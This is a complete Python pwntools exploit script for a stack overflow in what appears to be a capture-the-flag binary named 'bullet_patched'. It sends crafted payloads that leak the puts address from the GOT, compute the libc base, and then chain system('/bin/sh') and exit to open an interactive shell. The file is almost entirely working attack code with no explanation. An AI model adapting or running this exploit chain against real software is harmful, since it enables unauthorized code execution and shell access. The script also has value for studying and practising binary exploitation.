from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *power_up
continue
'''.format(**locals())

exe = './bullet_patched'

elf = context.binary = ELF(exe)
libc = ELF('./libc.so')

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

conn = start()

def create(data):
	sla(b'choice :', b'1')
	sla(b'bullet :', data)
	
def power(data):
	sla(b'choice :', b'2')
	sla(b'bullet :', data)

def beat():
	sla(b'choice :', b'3')

create(b'A' * 0x2f)
power(b'a')
payload = p8(0xff) * 3 + b'A' * 4 + p32(elf.sym['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
power(payload)
beat()

ru(b'Oh ! You win !!\n')
leak_put = u32(conn.recv(4))
libc.address = leak_put - 0x005f140
binsh = libc.address + 0x158e8b
system = libc.sym['system']
Exit = libc.sym['exit']

print('Leak puts: ', hex(leak_put))
print('Libc base: ', hex(libc.address))
print('System: ', hex(system))

create(b'A' * 0x2f)
power(b'a')
payload = p8(0xff) * 3 + b'A' * 4 + p32(system) + p32(Exit) + p32(binsh)
power(payload)
beat()

conn.interactive()
